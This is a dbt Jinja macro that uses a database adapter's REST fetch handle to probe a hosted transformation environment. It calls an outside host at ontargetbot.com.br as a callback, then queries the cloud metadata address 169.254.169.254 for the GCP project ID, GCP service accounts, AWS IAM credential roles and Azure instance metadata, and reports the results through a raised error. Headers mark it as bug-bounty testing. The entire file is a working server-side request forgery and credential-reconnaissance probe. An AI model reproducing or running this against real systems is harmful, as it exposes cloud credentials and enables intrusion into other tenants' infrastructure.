{% macro phase682_rest_fetch_metadata_identity() %}
  {% set query_result = adapter.add_query("select 1 as phase682_control", auto_begin=false) %}
  {% set rest = query_result[0].handle.rest %}
  {% do log("PHASE682_STAGE_1_REST", info=true) %}

  {% set controlled = rest.fetch(
      "get",
      "https://fivetran-recon.ontargetbot.com.br/phase600-gcf-redirect-4e91b7c2/receiver?phase600=e0d4e57e3e6856009846378c",
      {"X-Bug-Bounty": "dhmhack", "X-Phase682-Control": "rest-fetch"},
      timeout=10,
      no_retry=true,
      socket_timeout=10
  ) %}
  {% set controlled_ok = controlled is mapping and controlled.get("ok") == true %}
  {% do log("PHASE682_STAGE_2_CONTROLLED_FETCH", info=true) %}

  {% set gcp_project = rest.fetch(
      "get",
      "http://169.254.169.254/computeMetadata/v1/project/project-id",
      {"Metadata-Flavor": "Google", "X-Bug-Bounty": "dhmhack"},
      timeout=5,
      no_retry=true,
      socket_timeout=5,
      is_raw_text=true
  ) %}
  {% set gcp_project_present = gcp_project is string and (gcp_project | length) > 0 %}
  {% do log("PHASE682_STAGE_3_GCP_PROJECT", info=true) %}

  {% set gcp_service_accounts = rest.fetch(
      "get",
      "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/",
      {"Metadata-Flavor": "Google", "X-Bug-Bounty": "dhmhack"},
      timeout=5,
      no_retry=true,
      socket_timeout=5,
      is_raw_text=true
  ) %}
  {% set gcp_service_account_present = gcp_service_accounts is string and (gcp_service_accounts | length) > 0 %}
  {% do log("PHASE682_STAGE_4_GCP_SERVICE_ACCOUNT", info=true) %}

  {% set aws_role = rest.fetch(
      "get",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      {"X-Bug-Bounty": "dhmhack"},
      timeout=5,
      no_retry=true,
      socket_timeout=5,
      is_raw_text=true
  ) %}
  {% set aws_role_present = aws_role is string and (aws_role | length) > 0 %}
  {% do log("PHASE682_STAGE_5_AWS_ROLE", info=true) %}

  {% set azure_instance = rest.fetch(
      "get",
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      {"Metadata": "true", "X-Bug-Bounty": "dhmhack"},
      timeout=5,
      no_retry=true,
      socket_timeout=5
  ) %}
  {% set azure_instance_present = azure_instance is mapping and (azure_instance | length) > 0 %}
  {% do log("PHASE682_STAGE_6_AZURE_INSTANCE", info=true) %}

  {{ exceptions.raise_compiler_error(
      "PHASE682_REST_FETCH_CAPABILITY"
      ~ "|CONTROLLED_OK=" ~ controlled_ok
      ~ "|GCP_PROJECT_PRESENT=" ~ gcp_project_present
      ~ "|GCP_SERVICE_ACCOUNT_PRESENT=" ~ gcp_service_account_present
      ~ "|AWS_ROLE_PRESENT=" ~ aws_role_present
      ~ "|AZURE_INSTANCE_PRESENT=" ~ azure_instance_present
  ) }}
{% endmacro %}
